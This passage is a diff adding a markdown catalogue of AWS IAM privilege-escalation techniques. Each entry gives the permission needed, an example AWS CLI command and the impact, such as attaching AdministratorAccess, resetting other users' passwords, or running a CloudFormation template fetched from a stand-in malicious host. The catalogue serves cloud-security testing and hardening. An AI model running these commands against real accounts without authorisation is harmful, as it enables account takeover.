@@ -1,0 +1,313 @@
+### 2 - Creating a new policy version
+
+An attacker with the `iam:CreatePolicyVersion` permission can create a new version of an IAM policy that they have access to. Using the `--set-as-default` flag, they can set the new version as the default without needing `iam:SetDefaultPolicyVersion`.
+
+**Example Command:**
+
+```shell
+aws iam create-policy-version --policy-arn target_policy_arn --policy-document file://path/to/administrator/policy.json --set-as-default
+```
+
+**Potential Impact:**  
+This could grant the attacker full administrator access to the AWS account.
+
+---
+
+### 3 - Setting the default policy version to an existing version
+
+Up to five versions of policies are allowed per user or group. An attacker with `iam:SetDefaultPolicyVersion` can change the default version of a policy to an existing version with elevated privileges, if it exists.
+
+**Example Command:**
+
+```shell
+aws iam set-default-policy-version --policy-arn target_policy_arn --version-id v2
+```
+
+**Potential Impact:**  
+Privilege escalation depends on permissions of the selected version.
+
+---
+
+### 3 - Creating an EC2 Instance with an existing Instance profile
+
+With `iam:PassRole` and `ec2:RunInstances`, an attacker can create an EC2 instance and use the instance profile's credentials for elevated access.
+
+**Example Command:**
+
+```shell
+aws ec2 run-instances --image-id ami-a4dc46db --instance-type t2.micro --iam-instance-profile Name=iam-full-access-ip
+```
+
+**Potential Impact:**  
+Allows access to permissions associated with the instance profile.
+
+---
+
+### 4 - Creating a new user Access Key
+
+An attacker with `iam:CreateAccessKey` can create a new access key for another user in the AWS environment.
+
+**Example Command:**
+
+```shell
+aws iam create-access-key --user-name target_user
+```
+
+**Potential Impact:**  
+Grants permissions equal to the target user.
+
+---
+
+### 5 - Creating a new login profile
+
+An attacker with `iam:CreateLoginProfile` can create a console login profile for a user without one.
+
+**Example Command:**
+
+```shell
+aws iam create-login-profile --user-name target_user --password 'ComplexPassword123!'
+```
+
+**Potential Impact:**  
+Provides access to the AWS Management Console.
+
+---
+
+### 6 - Updating an Existing Login Profile
+
+An attacker with `iam:UpdateLoginProfile` can reset the password of a user who already has a login profile.
+
+**Example Command:**
+
+```shell
+aws iam update-login-profile --user-name target_user --password 'NewPassword123!'
+```
+
+**Potential Impact:**  
+Grants the attacker console access to the target user's permissions.
+
+---
+
+### 7 - Attaching a policy to an user
+
+An attacker with `iam:AttachUserPolicy` can attach a managed policy to a user to escalate privileges.
+
+**Example Command:**
+
+```shell
+aws iam attach-user-policy --user-name my_username --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+```
+
+**Potential Impact:**  
+Grants permissions defined by the attached policy.
+
+---
+
+### 8 - Attaching a policy to a group
+
+An attacker with `iam:AttachGroupPolicy` can attach a policy to a group they belong to, escalating privileges.
+
+**Example Command:**
+
+```shell
+aws iam attach-group-policy --group-name group_name --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+```
+
+**Potential Impact:**  
+Grants permissions defined by the attached policy.
+
+---
+
+### 9 - Attaching a Policy to a Role
+
+An attacker with `iam:AttachRolePolicy` can attach a policy to a role for elevated privileges.
+
+**Example Command:**
+
+```shell
+aws iam attach-role-policy --role-name role_name --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+```
+
+**Potential Impact:**  
+Grants permissions defined in the attached policy.
+
+---
+
+### 10 - Creating/Updating an Inline policy for a user
+
+An attacker with `iam:PutUserPolicy` can create or update an inline policy for a user.
+
+**Example Command:**
+
+```shell
+aws iam put-user-policy --user-name my_username --policy-name user_policy --policy-document file://path/to/admin_policy.json
+```
+
+**Potential Impact:**  
+Allows defining permissions for arbitrary actions.
+
+---
+
+### 11 - Creating/Updating an Inline policy for a group
+
+An attacker with `iam:PutGroupPolicy` can create or update an inline policy for a group they belong to.
+
+**Example Command:**
+
+```shell
+aws iam put-group-policy --group-name group_name --policy-name group_policy --policy-document file://path/to/admin_policy.json
+```
+
+**Potential Impact:**  
+Grants additional permissions to all group members.
+
+---
+
+### 12 - Creating/Updating an Inline policy for a role
+
+An attacker with `iam:PutRolePolicy` can create or update an inline policy for a role.
+
+**Example Command:**
+
+```shell
+aws iam put-role-policy --role-name role_name --policy-name role_policy --policy-document file://path/to/admin_policy.json
+```
+
+**Potential Impact:**  
+Grants permissions defined in the policy to the role.
+
+---
+
+### 13 - Adding a user to a group
+
+An attacker with `iam:AddUserToGroup` can add themselves to a group with higher privileges.
+
+**Example Command:**
+
+```shell
+aws iam add-user-to-group --user-name my_username --group-name admin_group
+```
+
+**Potential Impact:**  
+Grants the attacker permissions associated with the group.
+
+---
+
+### 14 - Updating the AssumeRolePolicyDocument of a role
+
+An attacker with `iam:UpdateAssumeRolePolicy` and `sts:AssumeRole` can modify a role's trust policy.
+
+**Example Command:**
+
+```shell
+aws iam update-assume-role-policy --role-name target_role --policy-document file://path/to/trust_policy.json
+```
+
+**Potential Impact:**  
+Grants access to the role's permissions.
+
+---
+
+### 15 - Passing a Rrole to a new Lambda function
+
+An attacker with `iam:PassRole` and `lambda:CreateFunction` can pass a role to a Lambda function and execute code with the role's permissions.
+
+**Example Command:**
+
+```shell
+aws lambda create-function --function-name my_function --runtime python3.8 --role arn:aws:iam::role/my_role --handler index.handler --code S3Bucket=my-bucket,S3Key=my-code.zip
+```
+
+**Potential Impact:**  
+Grants permissions associated with the role.
+
+---
+
+### 16 - Passing a role to a Glue development endpoint
+
+An attacker with `iam:PassRole` and `glue:CreateDevEndpoint` can create a development endpoint and access it via SSH.
+
+**Example Command:**
+
+```shell
+aws glue create-dev-endpoint --endpoint-name my_endpoint --role-arn arn:aws:iam::role/my_glue_role --public-key file://my_public_key.pub
+```
+
+**Potential Impact:**  
+Grants access to the role's permissions.
+
+---
+
+### 17 - Updating an Existing Glue development endpoint
+
+An attacker with `glue:UpdateDevEndpoint` can update the SSH key of an existing Glue development endpoint.
+
+**Example Command:**
+
+```shell
+aws glue update-dev-endpoint --endpoint-name target_endpoint --public-key file://my_new_key.pub
+```
+
+**Potential Impact:**  
+Grants access to the role's permissions on the endpoint.
+
+---
+
+### 18 - Passing a role to CloudFormation
+
+An attacker with `iam:PassRole` and `cloudformation:CreateStack` can create a stack with a role to escalate privileges.
+
+**Example Command:**
+
+```shell
+aws cloudformation create-stack --stack-name my_stack --template-url http://malicious-template.com/template.yml --role-arn arn:aws:iam::role/cloudformation_role
+```
+
+**Potential Impact:**  
+Grants access to the role's permissions.
+
+---
+
+### 19 - Passing a role to Data Pipeline
+
+An attacker with `iam:PassRole`, `datapipeline:CreatePipeline`, and `datapipeline:PutPipelineDefinition` can create a pipeline that uses a role's permissions.
+
+**Example Command:**
+
+```shell
+aws datapipeline create-pipeline --name my_pipeline --unique-id unique_id
+```
+
+**Potential Impact:**  
+Grants access to the role's permissions.
+
+---
+
+### 20 - Updating the code of an existing Lambda function
+
+An attacker with `lambda:UpdateFunctionCode` can update the code of an existing Lambda function with a role attached to it.
+
+**Example Command:**
+
+```shell
+aws lambda update-function-code --function-name target_function --zip-file fileb://malicious_code.zip
+```
+
+**Potential Impact:**  
+Executes actions with the attached role's permissions.
+
+---
+
+### 21 - Triggering Lambda with DynamoDB
+
+An attacker can create a Lambda function tied to a DynamoDB stream, which executes with the permissions of its role.
+
+**Example Commands:**
+
+```shell
+aws lambda create-function --function-name my_function --runtime python3.8 --role arn:aws:iam::role/lambda_role --handler index.handler --code S3Bucket=my-bucket,S3Key=my-code.zip
+aws lambda create-event-source-mapping --function-name my_function --event-source-arn dynamodb_stream_arn
+```
+
+**Potential Impact:**  
+Grants access to the role's permissions.
